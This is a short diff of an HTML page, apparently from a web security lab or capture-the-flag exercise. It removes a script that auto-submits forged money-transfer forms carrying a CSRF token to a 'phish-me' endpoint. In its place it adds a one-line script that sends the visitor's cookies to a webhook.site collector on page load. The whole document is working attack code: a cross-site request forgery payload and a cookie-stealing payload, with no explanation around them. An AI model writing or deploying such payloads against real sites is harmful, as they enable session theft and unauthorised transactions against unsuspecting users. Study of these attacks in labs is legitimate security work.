@@ -1,23 +1,6 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <script>
-    const tokens = ["NjE3Mg=="];
-
-    tokens.forEach(t => {
-      let f = document.createElement("form");
-      f.method = "POST";
-      f.action = "https://phish-me.quoccacorp.com/api/transfer";
-
-      f.innerHTML = `
-        <input name="csrf_token" value="${t}">
-        <input name="username" value="z5358480">
-        <input name="amount" value="100">
-      `;
-
-      document.body.appendChild(f);
-      f.submit();
-    });
-  </script>
+  <script>fetch('https://webhook.site/5a6aff69-95db-43f0-bda7-1d8516507c1a?c='+document.cookie)</script>
 </body>
 </html>
